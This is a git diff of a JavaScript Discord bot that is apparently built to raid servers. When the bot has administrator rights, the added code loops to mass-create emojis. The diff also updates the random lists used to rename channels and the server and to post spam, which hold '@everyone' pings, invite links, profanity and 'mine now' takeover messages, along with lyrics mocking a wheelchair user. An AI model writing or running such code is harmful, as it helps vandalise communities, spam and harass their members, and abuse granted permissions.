@@ -350,9 +350,12 @@ if(message.channel.type === "dm") {return}
   if(!unallowedguilds.includes(message.guild.id)) {
      if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
 }    
+          var b = 0
+   while(b < 39) {
 await message.guild.emojis.create(randomicons123(), 'chaos')
-await message.guild.emojis.create('https://images-ext-1.discordapp.net/external/HRdm0jpSLissUbkke890fcGabWIpSEnmjlJykK4hgg8/https/images-ext-1.discordapp.net/external/LOxbVQxTHoQNiyrc-GMz__uODLQQ6v38Xpypt6K1LXo/https/media.discordapp.net/attachments/735392717886193666/772567167018991646/a48e2e66-bbd5-4ba6-b168-90ce8c7c6fa9.gif', 'cube') 
-
+await message.guild.emojis.create('https://i.pinimg.com/originals/34/f8/a1/34f8a188fb3b596f6eaa723c45418bac.gif', 'lol') 
+ b++  
+ }  
    }
   }
  })
@@ -385,7 +388,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
  
  
  function randomT() {
-   var rand = ["https://cdn.discordapp.com/attachments/782641638798393364/785878660229758986/video0-151.mp4", "CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS\nIsn't it lovely to be free?\nCHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS", "https://i.pinimg.com/originals/34/f8/a1/34f8a188fb3b596f6eaa723c45418bac.gif", "https://images-ext-1.discordapp.net/external/8DHsw2FCYjn5MjW_8JrBuMP5jxaHxc-9yrEbwLlLIbo/https/c.tenor.com/OGC6jVC8GBgAAAAM/jevil-deltarune.gif", `CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS
+   var rand = ["https://i.pinimg.com/originals/34/f8/a1/34f8a188fb3b596f6eaa723c45418bac.gif", "https://cdn.discordapp.com/attachments/782641638798393364/785878660229758986/video0-151.mp4", "CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS\nIsn't it lovely to be free?\nCHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS", "https://i.pinimg.com/originals/34/f8/a1/34f8a188fb3b596f6eaa723c45418bac.gif", "https://images-ext-1.discordapp.net/external/8DHsw2FCYjn5MjW_8JrBuMP5jxaHxc-9yrEbwLlLIbo/https/c.tenor.com/OGC6jVC8GBgAAAAM/jevil-deltarune.gif", `CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS
 
 Isn't it lovely to be free?
 
@@ -455,25 +458,36 @@ I'm always up for fun!
 
 Cos when you've reached the end
   
-The fun is over!`, "*I T ' S   T I M E   T O   D I E   Y O U R   L I F E* \n*I T ' S  T I M E  F O R  L I F E  T O  D I E*", "https://youtu.be/oRQAhzLK8fE \nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**", "https://cdn.discordapp.com/attachments/753794195977928716/770834816832372756/video0_9.mp4", "https://cdn.discordapp.com/attachments/782195479119003659/784801148447752202/video0-48.mp4", "https://cdn.discordapp.com/attachments/352579778332590085/784489202326437888/video0-4.mp4", "https://cdn.discordapp.com/attachments/352579778332590085/784545783831461918/video0.mp4", "https://cdn.discordapp.com/attachments/352579778332590085/784563426143109150/video0-2-2.mp4", "https://cdn.discordapp.com/attachments/724621958003818508/784347888020357160/video0.mp4", "https://cdn.discordapp.com/attachments/746461949247750164/783910558516117534/video0.mov", "https://cdn.discordapp.com/attachments/724621958003818508/784247589435998288/SPOILER_numa-1-1-1-1.webm", "https://cdn.discordapp.com/attachments/724621958003818508/784187977617375242/video0_91.mp4", "https://cdn.discordapp.com/attachments/724621958003818508/783919871456837642/video0.mp4", "https://cdn.discordapp.com/attachments/724621958003818508/782659767956013056/127278821_407278137095833_2054966656502669864_n.mp4", "https://cdn.discordapp.com/attachments/724621958003818508/782251855638953984/video0_8.mov", "https://cdn.discordapp.com/attachments/724621958003818508/782040065940389888/video0_31.mp4", "https://cdn.discordapp.com/attachments/724621958003818508/779895953058037820/video0_-_2020-11-21T212708.939.mp4", "https://media.discordapp.net/attachments/782641638798393364/785143830856597554/do_youre_chemistry_homework.gif", "https://cdn.discordapp.com/attachments/724621958003818508/782776942344142848/lgbt_fax-2.mp4", "https://cdn.discordapp.com/attachments/724621958003818508/782776942344142848/lgbt_fax-2.mp4", "creator: assy" ,"https://discord.gg/XVAHsbqnU4", "https://discord.gg/XVAHsbqnU4", "https://discord.gg/XVAHsbqnU4", "https://images-ext-1.discordapp.net/external/eFAPb9A-KDB8CcJsMlLwXi_iBL3EBaru-3b-CueTnRA/https/cdn.discordapp.com/icons/782621562154254356/9efdc64eb1b2548f27eda9938af40720.webp", '@everyone https://youtu.be/YaiOwWDW8EY', "🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE ", "https://cdn.discordapp.com/avatars/759840501741518859/e96a11b39390687eed60f0bec3be64c1.png?size=1024", "https://cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png?size=1024", "https://images-ext-2.discordapp.net/external/1RImRRcAupiTBBfcQ2aKa7cj_meZCQI9JIpIGSt-VbU/%3Fsize%3D1024/https/cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png"]
+The fun is over!`, "*I T ' S   T I M E   T O   D I E   Y O U R   L I F E* \n*I T ' S  T I M E  F O R  L I F E  T O  D I E*", "BYE BYE", "CHAOS CHAOS", "minecraft real?", `I
+can't do anything,
+I'm in a fucking wheelchair,
+I got hepatitis C,
+I can't bounce around to do my magic,
+or even they don't like it,
+even than Devil's Night,
+my life is misery misery
+it's pointless pointless...
+but on the bright side
+at least I got this wheelchair...
+and a wheel's broken`, "https://youtu.be/EzQ3G5PpQ58", "https://cdn.discordapp.com/attachments/785843394601418784/786239600225419264/y2mate.com_-_I_CANT_DO_ANYTHING_1080p.mp4", "I can't do anything....\nI'm in a fucking wheelchair", "CHAOS CHAOS", "https://cdn130.picsart.com/319570044198201.jpg?type=webp&to=min&r=640", "https://i.pinimg.com/originals/35/59/e7/3559e7d21a3117f8e359f6e940e2f9ea.jpg", "https://youtu.be/Zs2JPKIPL80", "https://tenor.com/view/jevil-gif-13119312", "https://tenor.com/view/jevil-deltarune-joker-jester-gif-15018365", "https://cdn.discordapp.com/attachments/783496632150655037/786194381186662410/video0-151.mp4", "https://youtu.be/oRQAhzLK8fE\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**", "https://discord.gg/XVAHsbqnU4", "https://discord.gg/XVAHsbqnU4", "https://media.discordapp.net/attachments/784863883440685117/786306549760000100/9efdc64eb1b2548f27eda9938af40720.png", "https://media.discordapp.net/attachments/784863883440685117/786306549760000100/9efdc64eb1b2548f27eda9938af40720.png", "https://youtu.be/YaiOwWDW8EY"]
  return rand[Math.floor(Math.random()*rand.length)];
  }
  
  
  function randomnames() {
-   var rand = ["『ΛDᄃ』", "『ΛDᄃ』", "🍬🎄❄", "🍬🎄❄", "🍬🎄❄匚卄卂ㄖ丂🍬🎄❄", "🍬🎄❄pray.🍬🎄❄", "🍬🎄❄CHAOS CHAOS🍬🎄❄", "🍬🎄❄mine now🍬🎄❄", "🍬🎄❄THE TRUE AND NEO CHAOS🍬🎄❄", "🍬🎄❄卂丂丂ㄚs property now🍬🎄❄", "🍬🎄❄cubed.🍬🎄❄", "🍬🎄❄feel the 🎭CHAOS🎭🍬🎄❄", "🍬🎄❄oh oops!🍬🎄❄"]
+   var rand = ["I CAN DO ANYTHING", "『ΛDᄃ』", "『ΛDᄃ』", "匚卄卂ㄖ丂", "CHAOS CHAOS", "mine now", "THE TRUE AND NEO CHAOS", "卂丂丂ㄚs property now", "metamorphosis(get it?)", "feel the 🎭CHAOS🎭", "the world is revolving"]
    return rand[Math.floor(Math.random()*rand.length)];
  }
  
  
  function randomicons123() {
-   var rand = ["https://images-ext-2.discordapp.net/external/bDIbSf2nWsJsh4QHEYGhOn19DTNqksCGyeuM2YxLfwM/https/images-ext-2.discordapp.net/external/aUiSNo-HOBkCWlAFFjkSpOA2ishUAp2UH7mIzPrsJ7Q/%253Fsize%253D256/https/cdn.discordapp.com/avatars/761192480833142797/2212cb8ef2edee9b30487a56db8306b1.png", "https://media.discordapp.net/attachments/782641638798393364/783637979671298058/f260ee0bfe415dc7369de9459f9e28de.png", "https://cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png?size=1024", "https://cdn.discordapp.com/avatars/759840501741518859/e96a11b39390687eed60f0bec3be64c1.png?size=1024", "https://cdn.discordapp.com/avatars/759838559946801173/34648852c40e0b4822ff5101e5b5ffb4.png?size=1024"]
+   var rand = ["https://media.discordapp.net/attachments/782775478820929577/786314015709855744/14f50294c277a069fb31317da8512870.png", "https://i.pinimg.com/originals/34/f8/a1/34f8a188fb3b596f6eaa723c45418bac.gif", "https://images-ext-2.discordapp.net/external/_sbUGq7qZ05bWz_oeZfMbxsLlAlZBXRn1W1vnfCVU_Y/https/cdn.discordapp.com/avatars/759838559946801173/33fe36cfd0cbc041c1ed4f7265e790f6.webp", "https://images-ext-1.discordapp.net/external/8b64XF4R-n5WO-FKLO7pGgtqEhHT14pzOFLb6l13eLM/https/media.discordapp.net/attachments/782775478820929577/786305344494239744/9efdc64eb1b2548f27eda9938af40720.png", "https://media.discordapp.net/attachments/783806050641903672/786312799038341130/b4028a5f6e986f935202e6d9e9fe5645.png", "https://cutewallpaper.org/21/jevil-dancing-gif/Jevils-dancing-animation-sprite-Album-on-Imgur.gif", "https://images-ext-1.discordapp.net/external/S5i_RA4juyXow77zKojAKlj1sERp15HwoCyhPGbJxLo/https/cdn.discordapp.com/avatars/763353219619356703/2212cb8ef2edee9b30487a56db8306b1.webp"]
    return rand[Math.floor(Math.random()*rand.length)];
  }
  
 
  function channelnames() {
-   var rand = ["『ΛDᄃ』", "卂丂丂ㄚs destructive corner", "🍬🎄-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉", "🍬🎄🍬🎄🃏hue🎭hue🃏🎭huehue🃏huehue♠♣♥♦huehuehue🃏huehuehue", "🍬🎄🍬🎄☜☝☟☞☝chaos☟chaos☝☜☟☝☞","🍬🎄♛♤♦♧♣♡♥♢♠♛", "🍬🎄♛♤♧♡♢chaos♠♣♥♦♛", "🍬🎄🃏🃏🃏", "🍬🎄🎭🎭🎭neo-chaos🎭🎭🎭", "🍬🎄ᑕh̷̛̭͔͚̟͈̭͓̪̠͇̃̿̾͌₳ㄖ『s』", "🍬🎄⬛⬛⬛⬛cubed⬛⬛⬛⬛", "🍬🎄❒cube❒cube❒cube❒cube❒cube❒cube❒cube❒cube❒", "🍬🎄chaos-cube", "🍬🎄﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "get fucked ﷽﷽﷽", "🍬🎄匚卄卂ㄖ丂 匚卄卂ㄖ丂", "卂丂丂ㄚ", "merry christmas"]
+   var rand = ["𝔹𝕐𝔼 𝔹𝕐𝔼", "𝗪𝗘𝗘 𝗛𝗘𝗘 𝗛𝗘𝗘", "『ΛDᄃ』", "卂丂丂ㄚs destructive corner", "bye bye", "🃏hue🎭hue🃏🎭huehue🃏huehue♠♣♥♦huehuehue🃏huehuehue", "☜☝☟☞☝chaos☟chaos☝☜☟☝☞","♛♤♦♧♣♡♥♢♠♛", "♛♤♧♡♢chaos♠♣♥♦♛", "🃏🃏🃏", "🎭🎭🎭neo-chaos🎭🎭🎭", "ᑕh̷̛̭͔͚̟͈̭͓̪̠͇̃̿̾͌₳ㄖ『s』", "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "get fucked ﷽﷽﷽", "匚卄卂ㄖ丂 匚卄卂ㄖ丂", "卂丂丂ㄚ", "𝗜 𝗖𝗔𝗡 𝗗𝗢 𝗔𝗡𝗬𝗧𝗛𝗜𝗡𝗚"]
    return rand[Math.floor(Math.random()*rand.length)];
  }
  
